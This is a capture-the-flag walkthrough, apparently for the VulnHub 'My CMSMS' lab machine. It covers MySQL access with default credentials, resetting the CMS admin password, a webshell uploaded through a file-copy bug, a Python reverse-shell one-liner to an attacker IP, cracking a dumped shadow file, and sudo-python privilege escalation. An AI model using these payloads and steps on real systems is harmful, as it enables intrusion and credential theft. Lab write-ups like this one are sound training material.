<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>README.md</title>
</head><body>IP - 10.0.2.35<br/>
<br/>
---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
<br/>
nmap result<br/>
<br/>
┌──(root㉿kali)-[~/Desktop/offensive_security_playground/My-CMSMS]<br/>
└─# nmap -sC -sV 10.0.2.35 -p- -oN nmap_all_port.txt<br/>
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 00:16 +0630<br/>
Nmap scan report for 10.0.2.35<br/>
Host is up (0.00011s latency).<br/>
Not shown: 65531 closed tcp ports (reset)<br/>
PORT &nbsp; &nbsp; &nbsp;STATE SERVICE VERSION<br/>
22/tcp &nbsp; &nbsp;open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
| ssh-hostkey: <br/>
| &nbsp; 2048 27219eb53963e91f2cb26bd33a5f317b (RSA)<br/>
| &nbsp; 256 bf908aa5d7e5de89e61a36a193401857 (ECDSA)<br/>
|_ &nbsp;256 951f329578085045cd8c7c714ad46c1c (ED25519)<br/>
80/tcp &nbsp; &nbsp;open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.38 ((Debian))<br/>
|_http-server-header: Apache/2.4.38 (Debian)<br/>
|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.<br/>
|_http-title: Home - My CMS<br/>
3306/tcp &nbsp;open &nbsp;mysql &nbsp; MySQL 8.0.19<br/>
|_ssl-date: TLS randomness does not represent time<br/>
| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate<br/>
| Not valid before: 2020-03-25T09:30:14<br/>
|_Not valid after: &nbsp;2030-03-23T09:30:14<br/>
| mysql-info: <br/>
| &nbsp; Protocol: 10<br/>
| &nbsp; Version: 8.0.19<br/>
| &nbsp; Thread ID: 39<br/>
| &nbsp; Capabilities flags: 65535<br/>
| &nbsp; Some Capabilities: SupportsTransactions, LongPassword, Support41Auth, DontAllowDatabaseTableColumn, IgnoreSigpipes, FoundRows, LongColumnFlag, SupportsLoadDataLocal, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, InteractiveClient, ODBCClient, ConnectWithDatabase, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments<br/>
| &nbsp; Status: Autocommit<br/>
| &nbsp; Salt: <br/>
| &lt;%r0\x19 &nbsp; &nbsp; &nbsp;3II\x0FKF(*\x1B=\x03s2<br/>
|_ &nbsp;Auth Plugin Name: mysql_native_password<br/>
33060/tcp open &nbsp;mysqlx?<br/>
| fingerprint-strings: <br/>
| &nbsp; DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: <br/>
| &nbsp; &nbsp; Invalid message"<br/>
|_ &nbsp; &nbsp;HY000<br/>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br/>
SF-Port33060-TCP:V=7.93%I=7%D=2/21%Time=63F3B1EE%P=x86_64-pc-linux-gnu%r(N<br/>
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\<br/>
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp<br/>
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b<br/>
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers<br/>
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2<br/>
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI<br/>
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")<br/>
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01<br/>
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie<br/>
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x<br/>
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"<br/>
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9<br/>
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\<br/>
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0<br/>
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,<br/>
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0<br/>
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\<br/>
SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions<br/>
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x<br/>
SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"<br/>
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1<br/>
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000<br/>
SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0<br/>
SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r<br/>
SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0<br/>
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\<br/>
SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");<br/>
MAC Address: 08:00:27:62:B8:22 (Oracle VirtualBox virtual NIC)<br/>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
<br/>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
Nmap done: 1 IP address (1 host up) scanned in 26.93 seconds<br/>
<br/>
---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
<br/>
Enumerating port 3306 mysql<br/>
<br/>
I found that I can login mysql server with default credential username "root" and password "root". I got cms admin password from mysql.<br/>
<br/>
&nbsp;MySQL [cmsms_db]&gt; select * from cms_users;<br/>
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+<br/>
| user_id | username | password &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | admin_access | first_name | last_name | email &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | active | create_date &nbsp; &nbsp; &nbsp; &nbsp; | modified_date &nbsp; &nbsp; &nbsp; |<br/>
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+<br/>
| &nbsp; &nbsp; &nbsp; 1 | admin &nbsp; &nbsp;| fb67c6d24e756229aab021cea7605fb3 | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1 | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | admin@mycms.local | &nbsp; &nbsp; &nbsp;1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |<br/>
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+<br/>
1 row in set (0.001 sec)<br/>
<br/>
I tried to crack this md5 but it didn't work so I update the admin password:<br/>
<br/>
MySQL [cmsms_db]&gt; UPDATE cms_users SET password = '21232f297a57a5a743894a0e4a801fc3' WHERE user_id = 1;<br/>
Query OK, 1 row affected (0.018 sec)<br/>
Rows matched: 1 &nbsp;Changed: 1 &nbsp;Warnings: 0<br/>
<br/>
MySQL [cmsms_db]&gt; select * from cms_users;<br/>
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+<br/>
| user_id | username | password &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | admin_access | first_name | last_name | email &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | active | create_date &nbsp; &nbsp; &nbsp; &nbsp; | modified_date &nbsp; &nbsp; &nbsp; |<br/>
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+<br/>
| &nbsp; &nbsp; &nbsp; 1 | admin &nbsp; &nbsp;| 21232f297a57a5a743894a0e4a801fc3 | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;1 | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | admin@mycms.local | &nbsp; &nbsp; &nbsp;1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |<br/>
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+<br/>
1 row in set (0.001 sec)<br/>
<br/>
<br/>
With above method didin't work so I research about updating mysql data for "cms made simple" and I found this article help fix update problem:<br/>
<br/>
https://forum.cmsmadesimple.org/viewtopic.php?t=76565<br/>
<br/>
mysql update query for cms made simple:<br/>
<br/>
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin';<br/>
<br/>
MySQL [cmsms_db]&gt; update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin';<br/>
Query OK, 1 row affected (0.014 sec)<br/>
Rows matched: 1 &nbsp;Changed: 1 &nbsp;Warnings: 0<br/>
<br/>
<br/>
Now, I can login into admin panel:<br/>
<br/>
username - admin<br/>
password - admin<br/>
<br/>
<br/>
---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
<br/>
I upload the webshell with this vulnerability method:<br/>
<br/>
http://dev.cmsmadesimple.org/bug/view/12502<br/>
<br/>
Step 1:<br/>
<br/>
I added my webshell code into .png file<br/>
<br/>
cat __welcome.php &gt; phpinfo.png<br/>
<br/>
Step 2:<br/>
<br/>
Upload phpinfo.png in here<br/>
<br/>
http://10.0.2.35/admin/moduleinterface.php?mact=FileManager,m1_,defaultadmin,0&amp;__c=0b5825cd06ecf29a777<br/>
<br/>
Step 3:<br/>
<br/>
Select the phpinfo.png and then click "copy" button. Add "Target File name:" as "phpinfo.php" and then click "copy".<br/>
<br/>
Boom! I got my webshell<br/>
<br/>
Access webshell from here:<br/>
<br/>
http://10.0.2.35/uploads/phpinfo.php<br/>
<br/>
---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
<br/>
I got reverse shell with python2 from https://www.revshells.com with my webshell command<br/>
<br/>
payload - python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'<br/>
<br/>
---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
<br/>
Readable shadow.bak file<br/>
<br/>
After running linpeas script, found /var/backups/shadow.bak is readable by everyone.<br/>
<br/>
www-data@mycmsms:/tmp$ cat /var/backups/shadow.bak<br/>
root:$6$iJMQ9Yh/FREEfPRO$PkfB7e4jnXBppAd4QJ1l9e068Buung0nhx0i1E6p7AzeYBE6O6BqHme82yVAWxvy.TeP1IcOJ6PB.MTd2CRKW/:18439:0:99999:7:::<br/>
daemon:*:18346:0:99999:7:::<br/>
bin:*:18346:0:99999:7:::<br/>
sys:*:18346:0:99999:7:::<br/>
sync:*:18346:0:99999:7:::<br/>
games:*:18346:0:99999:7:::<br/>
man:*:18346:0:99999:7:::<br/>
lp:*:18346:0:99999:7:::<br/>
mail:*:18346:0:99999:7:::<br/>
news:*:18346:0:99999:7:::<br/>
uucp:*:18346:0:99999:7:::<br/>
proxy:*:18346:0:99999:7:::<br/>
www-data:*:18346:0:99999:7:::<br/>
backup:*:18346:0:99999:7:::<br/>
list:*:18346:0:99999:7:::<br/>
irc:*:18346:0:99999:7:::<br/>
gnats:*:18346:0:99999:7:::<br/>
nobody:*:18346:0:99999:7:::<br/>
_apt:*:18346:0:99999:7:::<br/>
systemd-timesync:*:18346:0:99999:7:::<br/>
systemd-network:*:18346:0:99999:7:::<br/>
systemd-resolve:*:18346:0:99999:7:::<br/>
armour:$6$lKH6hAvjcR1pMBbw$tHxI4VfjoB3JEyPsd4tHzj.IqObn4kRCgkb/rfHRBbo76X2rp9yT93YaSQuvQ9Qd3gT1YJaGxKyb0J3fNjkGb0:18438:0:99999:7:::<br/>
systemd-coredump:!!:18346::::::<br/>
messagebus:*:18346:0:99999:7:::<br/>
sshd:*:18346:0:99999:7:::<br/>
mysql:!:18346:0:99999:7:::<br/>
<br/>
---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
<br/>
Privilege Escalation (Crack root password with hashcat)<br/>
<br/>
I got this root hash $6$iJMQ9Yh/FREEfPRO$PkfB7e4jnXBppAd4QJ1l9e068Buung0nhx0i1E6p7AzeYBE6O6BqHme82yVAWxvy.TeP1IcOJ6PB.MTd2CRKW/ and crack it with hashcat.<br/>
<br/>
Step 1:<br/>
<br/>
save root hash with new file:<br/>
<br/>
nano root_hash<br/>
<br/>
Step 2:<br/>
<br/>
hashcat -m 1800 root_hash /usr/share/wordlists/rockyou.txt<br/>
<br/>
Step 3:<br/>
<br/>
Boom! password cracked<br/>
<br/>
username - root<br/>
password - Password <br/>
<br/>
---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
<br/>
Vulnhub Flag<br/>
<br/>
<br/>
root@mycmsms:~# cat proof.txt <br/>
&nbsp; &nbsp;##############################################################################################<br/>
&nbsp; &nbsp;# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Armour Infosec &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#<br/>
&nbsp; &nbsp;# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; --------- www.armourinfosec.com ------------ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
&nbsp; &nbsp;# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; My CMSMS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
&nbsp; &nbsp;# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Designed By &nbsp;:- Pankaj Verma &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
&nbsp; &nbsp;# &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Twitter &nbsp; &nbsp; &nbsp;:- @_p4nk4j &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #<br/>
&nbsp; &nbsp;##############################################################################################<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; **Thanks for Trying this Box**<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Here's Your Flag<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; b315ed055787c0994d8a7b08b2be9244 (Thank You)<br/>
<br/>
---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
<br/>
Offensive Security playground lab flags and new experiences<br/>
<br/>
www-data@mycmsms:/tmp$ cat /var/www/local.txt<br/>
ade78981dd24b075ceb900ff7ca8c712<br/>
<br/>
Found armour password from:<br/>
<br/>
-rw-r--r-- 1 www-data www-data 45 Jun 24 &nbsp;2020 /var/www/html/admin/.htpasswd<br/>
TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=<br/>
<br/>
<br/>
┌──(root㉿kali)-[/tmp]<br/>
└─# echo "TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=" | base64 -d | base32 -d<br/>
armour:Shield@123<br/>
<br/>
<br/>
Privilege Escalation ((root) NOPASSWD: /usr/bin/python)<br/>
<br/>
swith into armour and execute sudo -l and found:<br/>
<br/>
armour@mycmsms:/tmp$ sudo -l<br/>
Matching Defaults entries for armour on mycmsms:<br/>
&nbsp; &nbsp; env_reset, mail_badpass,<br/>
&nbsp; &nbsp; secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br/>
<br/>
User armour may run the following commands on mycmsms:<br/>
&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/python<br/>
<br/>
<br/>
I search at gtfobin for this python binary and found this:<br/>
<br/>
https://gtfobins.github.io/gtfobins/python/#sudo<br/>
<br/>
armour@mycmsms:/tmp$ sudo python -c 'import os; os.system("/bin/sh")'<br/>
# whoami<br/>
root<br/>
<br/>
root@mycmsms:~# cat proof.txt <br/>
9ce4de6be58f6775824095330040053d<br/>
<br/>
<br/>
</body></html>